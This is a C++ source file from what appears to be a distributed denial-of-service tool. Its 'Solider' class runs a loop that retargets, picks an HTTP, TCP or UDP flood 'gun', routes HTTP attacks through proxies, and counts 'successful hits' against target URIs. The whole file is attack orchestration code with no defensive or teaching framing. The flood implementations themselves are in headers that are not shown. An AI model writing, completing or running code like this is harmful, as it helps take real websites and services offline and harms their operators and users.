#include <memory>

#include "solider.h"

#include "http_gun.h"
#include "resolvers.h"
#include "tcp_gun.h"
#include "udp_gun.h"
#include "wrappers/tcp_wrapper.h"

void Solider::ExecuteOrders(const TaskController &task,
	Attackers::Target &target, SPProxyGetter proxyGetter)
{
	std::size_t hitsCount{0};
	NetUtil::PAddressResolver tcpResolver{std::make_unique<TCPAddressResolver>()};
	NetUtil::PAddressResolver udpResolver{std::make_unique<Wrappers::UDPAddressResolver>()};

	Attackers::PGun gun;
	while(!task.ShouldStop())
	{
		if(target.NeedWeaponAim())
		{
			target.Retarget(task);
		}

		Attackers::AttackMethod method = target.GetAttackMethod();
		const URI coordinates = target.GetCoordinates();

		auto newGun(GunFactory(method, task, proxyGetter,
			tcpResolver, udpResolver));
		gun.swap(newGun);
		if(gun)
		{
			hitsCount += gun->FireTillDead(coordinates);
		}
	}
	SPDLOG_INFO("Stoping execution with {} succesfull hits", hitsCount);
}


Attackers::PGun Solider::GunFactory(Attackers::AttackMethod attackMethod,
	const TaskController &owningTask,
	SPProxyGetter proxyGetter,
	NetUtil::PAddressResolver tcpAddressResolver,
	NetUtil::PAddressResolver udpAdressResolver)
{
	switch(attackMethod)
	{
		case Attackers::AttackMethod::HTTPAttack:
		{
			return std::make_unique<Attackers::HTTPGun>(owningTask, proxyGetter);
		}
		case Attackers::AttackMethod::TCPAttack:
		{
			return std::make_unique<Attackers::TCPGun>(owningTask, tcpAddressResolver);
		}
		case Attackers::AttackMethod::UDPAttack:
		{
			return std::make_unique<Attackers::UDPGun>(owningTask, udpAdressResolver);
		}
		default:
		{
			SPDLOG_ERROR("Got not supported attacker");
			return nullptr;
		}
	}
}
